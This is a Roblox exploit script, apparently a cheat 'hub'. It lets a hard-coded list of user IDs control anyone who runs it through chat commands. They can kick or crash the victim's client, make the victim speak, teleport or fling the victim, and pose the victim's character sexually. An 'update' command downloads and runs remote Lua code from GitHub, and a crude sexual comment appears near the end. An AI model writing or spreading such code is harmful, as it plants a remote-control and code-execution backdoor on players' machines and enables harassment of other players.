local notifs = loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua'))()
local players = game:GetService("Players")
local plr = players.LocalPlayer
local OnBenx = false
local OnStand = false
local StandLoop = false
local debounce = false
local AntiFling = false
local prefix = "!"

local BrokenVip = {
	--plr.UserId,
	4786851352, 
    4011054110,
    4900408237,
	4933877451,
	2039851654,
	--270910992,
}

local BrokenPremium = {
	--plr.UserId,
	4011054110,
	--270910992,
}

local BrokenStaff = {
	plr.UserId,
	4011054110,
	270910992,
}

local anims = {
	10214317325,
	13823324057,
}
local function GetRoot(player)
	return player.Character.HumanoidRootPart
end

local function GetLT(player)
	return player.Character.LowerTorso or player.Character.Torso
end

local function GetHum(player)
	return player.Character.Humanoid
end

local function getPlayer(str)
    str = string.lower(str)
	if str == "." then
		return plr
	end
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.DisplayName:lower():sub(1, #str)== str then
            return player
        end
    end
    return nil
end

local function Arg3(command)
	local x = ""
	for i,v in pairs(command) do
		pcall(function ()
			if i>=2 then
				x = x.." "..command[i+1]
			end
		end)
	end
	return x
end

local function CheckCMD(arg,command)
	local sp = string.split(arg:lower()," ")
    --[[
    if sp[1] == "/e" and sp[2] == prefix..""..command:lower() then
        arg = arg:sub(3,#arg)
        return true
    end
    ]]
	if sp[1] == prefix..""..command:lower() then
		return true
	else
		return false
	end
end

local function err(msg:string)
	notifs.alert(msg,Color3.new(1,0,0), 5, "")
end
local function message(msg:string)
	notifs.alert(msg,Color3.new(1,1,1), 5, "rainbow")
end

local function PlayAnim(id,time,speed)
	pcall(function()
		plr.Character.Animate.Disabled = false
		local hum = plr.Character.Humanoid
		local animtrack = hum:GetPlayingAnimationTracks()
		for i,track in pairs(animtrack) do
			track:Stop()
		end
		plr.Character.Animate.Disabled = true
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..id
		local loadanim = hum:LoadAnimation(Anim)
		loadanim:Play()
		loadanim.TimePosition = time
		loadanim:AdjustSpeed(speed)
		loadanim.Stopped:Connect(function()
			plr.Character.Animate.Disabled = false
			for i, track in pairs (animtrack) do
        		track:Stop()
    		end
		end)
	end)
end

local function BenxTP(player,offset)
	GetRoot(plr).CFrame = GetRoot(player).CFrame * CFrame.new(0,-1.5,offset) * CFrame.Angles(-1.5,math.rad(0),0); 
	GetRoot(plr).Velocity = Vector3.new(0,0,0)						
end
local function StandTp(player,offset,side)
	GetRoot(plr).CFrame = GetRoot(player).CFrame 
		* CFrame.new(side == 1 and -2 or 2, offset, 1.5) 
			* CFrame.Angles(0,math.rad(side == 1 and 15 or -15),0)

	GetRoot(plr).Velocity = Vector3.new(0,-100,0)
	GetRoot(plr).AssemblyAngularVelocity = Vector3.new(0,0,0)
end

local function ToggleRagdoll(bool)
	pcall(function()
		if game.PlaceId == 5950733731 then
			plr.Character:FindFirstChild("Falling down").Disabled = bool
    	    plr.Character:FindFirstChild("Swimming").Disabled = bool
    	   	plr.Character:FindFirstChild("StartRagdoll").Disabled = bool
	        plr.Character:FindFirstChild("Pushed").Disabled = bool
	        plr.Character:FindFirstChild("KillScript").Disabled = bool
    	    plr.Character:FindFirstChild("RagdollMe").Disabled = bool
		end
	end)
end

local function ExecuteCommand(Pid,ms)
	--	{{	vars	}}	--
    local msg = ms
	local Speaker = players:GetPlayerByUserId(Pid)
	local LowerCMD = msg:lower()
	local Split = string.split(LowerCMD," ")
	local LowerName, LowerDisplay = string.lower(plr.Name), string.lower(plr.DisplayName)
	if Split[1] == "/e" then
        msg = ms:sub(3,#ms)
    end
	local LowerCMD = msg:lower()
	local Split = string.split(LowerCMD," ")
	--	{{	Client/Speaker check vars	}}	--
	--[[
	local ClientIsVip = table.find(BrokenVip,plr.UserId)
	local ClientIsPremium = table.find(BrokenPremium,plr.UserId)
	local ClientIsStaff = table.find(BrokenStaff,plr.UserId)
	local SpeakerIsVip = table.find(BrokenVip, Speaker.UserId)
	local SpeakerIsPremium = table.find(BrokenPremium,Speaker.UserId)
	local SpeakerIsStaff = table.find(BrokenStaff,Speaker.UserId)
	]]


	local suc, res = pcall(function()
		
		local Allowed = string.find(LowerDisplay,Split[2]) or string.find(LowerName,Split[2])
		--[[local RankAllowed = false
		if ClientIsVip or ClientIsPremium or ClientIsStaff then
			RankAllowed = false
		elseif SpeakerIsStaff or (SpeakerIsPremium and (not ClientIsStaff)) or (SpeakerIsVip and (not ClientIsPremium or not ClientIsStaff)) then
			RankAllowed = true
		end
		]]
		--	{{	Main block if player NOR paid/rank lower than speaker	}}	--
		if Allowed then
			--if not RankAllowed then return end
			local victim = getPlayer(Split[2])
			--	{{	if !<command><player> is not a local player then stop the function	}}	--
			if victim ~= plr then return end
			if CheckCMD(msg,"bring") then
				GetRoot().CFrame = GetRoot(Speaker).CFrame
			end
            if CheckCMD(msg,"announce") then
				message(Split[3])
			end
            if CheckCMD(msg,"update") then
                loadstring(game:HttpGet('https://raw.githubusercontent.com/Edward-Bill/Scripts/main/__'))()
            end
			if CheckCMD(msg,"fling") then
                for i=1,math.random(4,6) do
                    --GetRoot(victim).Velocity = Vector3.new(i*(i^i)/(i^2),math.abs(i*(i^i)/(i^2)),i*(i^i)/(i^2))
					GetHum(plr).Sit = true
					GetHum(plr).PlatformStand = true
                    GetRoot(plr).AssemblyAngularVelocity = Vector3.new(math.random(-i^i,i^i), i^(i*2), math.random(-i^i,i^i))
					task.wait(1)
                end 
				GetHum(plr).Sit = false
				GetHum(plr).PlatformStand = false
			end
			if CheckCMD(msg,"check") then
                local args = {[1] = ("/w "..Speaker.Name.." i'm using ElusiveHub"),[2] = "All"}
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			end
			if CheckCMD(msg,"kill") then
				plr.Character.Humanoid.Health = 0
			end
			if CheckCMD(msg,"say") then
				--[[if Split[3] == nil then error("Error!\nNo argument provided in the command!") end]]
				local Message = Arg3(Split)
				local args = {[1] = Message,[2] = "All"}
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			end
			if CheckCMD(msg,"freeze") then
				plr.Character.HumanoidRootPart.Anchored = true
			end
			if CheckCMD(msg,"unfreeze") then
				GetRoot(plr).Anchored = false
			end
			if CheckCMD(msg,"kick") then
				--[[if Split[3] == nil then error("Error!\nNo argument provided in the command!") end]]
				--[[if not SpeakerIsPremium or not SpeakerIsStaff then
					local args = {[1] = ("/w "..Speaker.Name.." automated message: you need to buy premium for this command!"),[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
					return
				end]]
				GetRoot(plr).CFrame = GetRoot(Speaker).CFrame * CFrame.new(0,0,-6) * CFrame.Angles(0,math.rad(180),0)
				--local args = {[1] = ("I got kicked by @"..Speaker.Name),[2] = "All"}
				--game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
				task.wait(0.1)
				plr:Kick("You has been kicked by Staff Member!\nRason: "..Arg3(Split))
				--[[if SpeakerIsStaff then
					plr:Kick("You has been kicked by Staff Member!\nRason: "..Arg3(Split))
				elseif SpeakerIsPremium then
					plr:Kick("You has been kicked by Premium Buyer!\nRason: "..Arg3(Split))
				end]]
			end
			if CheckCMD(msg,"stand") then
				if OnBenx then OnBenx = false end task.wait()
				if OnStand then OnStand = false end task.wait()
				OnStand = true
				ToggleRagdoll(true)
				local incr = true
				local val = 0
				local randomSide = math.random(1,2)
				local rand = anims[math.random(1,#anims)]
				game.Workspace.FallenPartsDestroyHeight = 0/0
				if not StandLoop then return end

				while true do task.wait()
					if not OnStand then
						repeat task.wait()
						until OnStand
					end
					
					if not Speaker then OnStand = false err("lost focus on Speaker!") end
					pcall(function()
						if incr then
							val += 0.01
							if val >= 1.5 then incr = false end
						else
							val -= 0.01
							if val <= -1.5 then incr = true end
						end
						StandTp(Speaker,val,randomSide)
						if rand == anims[2] then
							PlayAnim(rand,18.9,0)
						elseif rand == anims[1] then
							PlayAnim(rand,3,0)
						end
					end)
				end
			end
			if CheckCMD(msg,"unstand") then
				OnStand = false
				for i,v in pairs(GetHum(plr):GetPlayingAnimationTracks()) do
					v:Stop()
				end
				plr.Character.Animate.Disabled = false
			end
			if CheckCMD(msg,"fl") then
				--[[--[[if Split[3] == nil then error("Error!\nNo argument provided in the command!") end]]
								--[[if not SpeakerIsPremium or not SpeakerIsStaff then
					local args = {[1] = ("/w "..Speaker.Name.." automated message: you need to buy premium for this command!"),[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
					return
				end]]
				local attacked = getPlayer(Split[3])
				if Split[3] == "random" then
					attacked = players[math.random(1, #players)]
				end
				local pos = GetRoot(plr).CFrame
				local isStand = OnStand
				local isBang = OnBenx
				if isStand then OnStand = false end
				if isBang then OnBenx = false end
				if not debounce then
					pcall(function()
						game.Workspace.FallenPartsDestroyHeight = 0/0
						ToggleRagdoll(true)
						for i=1, 5 do task.wait()
							GetRoot(plr).CFrame = attacked.Character.HumanoidRootPart.CFrame + Vector3.new(0, 100, 0)
							GetRoot(plr).AssemblyAngularVelocity = Vector3.new(0, 0, 0)
							GetRoot(plr).Velocity = Vector3.new(0, 0, 0)
						end
						for i=1, 25 do task.wait()
							game.Workspace.FallenPartsDestroyHeight = 0/0
							GetRoot(plr).CFrame = GetRoot(attacked).CFrame 
								* CFrame.new(math.random(-1,1), math.random(-1,1), math.random(-1,1))
							task.wait()
							GetRoot(plr).CFrame = GetRoot(attacked).CFrame 
								* CFrame.new(math.random(-1,1), math.random(-1,1), math.random(-1,1)) 
									+ Vector3.new(GetRoot(attacked).Velocity)
							GetRoot(plr).AssemblyAngularVelocity = Vector3.new(0, 1e7, 0)
							GetRoot(plr).Velocity = Vector3.new(0, 0, 0)
						end
						for i=1, 5 do task.wait()
							GetRoot(plr).CFrame = pos + Vector3.new(0, 100, 0)
							GetRoot(plr).AssemblyAngularVelocity = Vector3.new(0, 0, 0)
							GetRoot(plr).Velocity = Vector3.new(0, 0, 0)
						end
						for i=1, 10 do task.wait()
							GetRoot(plr).CFrame = pos
							GetRoot(plr).AssemblyAngularVelocity = Vector3.new(0, 0, 0)
							GetRoot(plr).Velocity = Vector3.new(0, 0, 0)
						end
					end)
				end
				debounce = true
				task.delay(1, ExecuteCommand)
				debounce = false
				if isStand then OnStand = true end
				if isBang then OnBenx = true end
			end

			if CheckCMD(msg,"liftup") then
				local pos = GetRoot(plr).CFrame
				for i=1,50 do
					GetRoot(plr).CFrame = Speaker.Character.PrimaryPart.CFrame * CFrame.Angles(math.rad(90),0,0) + Vector3.new(0,-2,0)
					GetRoot(plr).Velocity = Vector3.new(0,1000,0)
				end
				task.wait(0.2)
				GetRoot(plr).Velocity = Vector3.zero
				GetRoot(plr).CFrame = pos
			end
			if CheckCMD(msg,"benx") then
								--[[if not SpeakerIsPremium or not SpeakerIsStaff then
					local args = {[1] = ("/w "..Speaker.Name.." automated message: you need to buy premium for this command!"),[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
					return
				end]]
				if OnStand then OnStand = false end task.wait()
				if OnBenx then OnBenx = false end task.wait()
				OnBenx = true
				ToggleRagdoll(true)
				local incr = false
				local val = 0
		
				repeat task.wait()
					pcall(function()
						if incr then
							val += 0.01
							if val >= -1 then incr = false end
						else
							val -= 0.01
							if val <= -4.5 then incr = true end
						end
						GetHum(plr).Sit = true
						BenxTP(Speaker, val)
					end)
				until OnBenx == false
			end
			if CheckCMD(msg,"unbenx") then
				OnBenx = false
				plr.Character.Animate.Disabled = false
			end
			if CheckCMD(msg,"crash ") then
								--[[if not SpeakerIsPremium or not SpeakerIsStaff then
					local args = {[1] = ("/w "..Speaker.Name.." automated message: you need to buy premium for this command!"),[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
					return
				end]]
				err("AN INTERNAL ERROR") task.wait(1)
                pcall(function()
					while true do end
				end)
			end
			if CheckCMD(msg,"mine") then
				local l = workspace:FindFirstChild("Landmines")
				if l then
					local m = l:GetChildren()
					if #m > 0 then
						local rm = m[math.random(1, #m)]
						if rm.Name == "Landmine" then
							local v = rm:FindFirstChild("HitPart")
							local p = plr.Character:FindFirstChild("HumanoidRootPart")
							if v and p then
								p.CFrame = v.CFrame
							end
						end
					end
				end 
			end
			if CheckCMD(msg,"cannon") then
                fireclickdetector(game:GetService("Workspace").Folder.Cannons.Cannon.Cannon_Part.ClickDetector, 0)
			end
			if CheckCMD(msg,"yeet") then
				for i = 1,10 do
					GetRoot(victim).CFrame = plr.Character.HumanoidRootPart.CFrame*CFrame.new(0,5,0)
					GetRoot(victim).Velocity = Vector3.new(0,i^i/10e5,0)
					task.wait()
				end
			end
			if CheckCMD(msg,"rejoin") then
								--[[if not SpeakerIsPremium or not SpeakerIsStaff then
					local args = {[1] = ("/w "..Speaker.Name.." automated message: you need to buy premium for this command!"),[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
					return
				end]]
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
			if CheckCMD(msg,"ragdoll") then
                plr.Character:FindFirstChild("Falling down").Disabled = false
                plr.Character:FindFirstChild("Swimming").Disabled = false
                plr.Character:FindFirstChild("StartRagdoll").Disabled = false
                plr.Character:FindFirstChild("Pushed").Disabled = false
                plr.Character:FindFirstChild("RagdollMe").Disabled = false
				plr.Character.Humanoid:ChangeState(0)
			end

			if CheckCMD(msg,"uptime") then
				local seconds = game.Workspace.DistributedGameTime
				--[[if Split[3] == nil then error("Error!\nNo argument provided in the command!") end]]
				local hours,mins,secs = "","",""
				if seconds <= 0 then
					return "00:00:00";
				else
					hours = string.format("%02.f", math.floor(seconds/3600));
					mins = string.format("%02.f", math.floor(seconds/60 - (hours*60)));
					secs = string.format("%02.f", math.floor(seconds - hours*3600 - mins *60));
				end
				if Split[3] == "h" then
					local args = {[1] = ("uptime in hours is: "..hours.."H"),[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
				elseif Split[3] == "m" then
					local args = {[1] = ("uptime in minutes is: "..mins.."M"),[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
				elseif Split[3] == "s" then
					local args = {[1] = ("uptime in seconds is: "..math.floor(seconds).."S"),[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
				elseif Split[3] == "full" then
					local args = {[1] = ("Full uptime is: "..hours..":"..mins..":"..secs),[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
				end
			end
		end
	end)
	if not suc then warn(notifs.alert(res,Color3.new(1,0,0), 5, "")) end
end

if _G.connections then 
    for i,v in _G.connections do
        v:Disconnect()
    end
    table.clear(_G.connections) end
_G.connections = {}

for i,v in pairs(players:GetPlayers()) do
	if table.find(BrokenVip,v.UserId) or table.find(BrokenPremium,v.UserId) or table.find(BrokenStaff,v.UserId) then
		--	{{	checks if function is not connected	}}	--
		if not table.find(_G.connections,v) then
			_G.connections[v] = v.Chatted:Connect(function(command)
				ExecuteCommand(v.UserId,command)
			end)
		end
	end
end

players.PlayerAdded:Connect(function(v)
	if table.find(BrokenVip,v.UserId) or table.find(BrokenPremium,v.UserId) or table.find(BrokenStaff,v.UserId) then
		--	{{	da ya lublu sosat` chlen, eto penis, i na mne jidkaya sperma	}}	--
		if not table.find(_G.connections,v) then
			_G.connections[v] = v.Chatted:Connect(function(command)
				ExecuteCommand(v.UserId,command)
			end)
		end
	end
end)
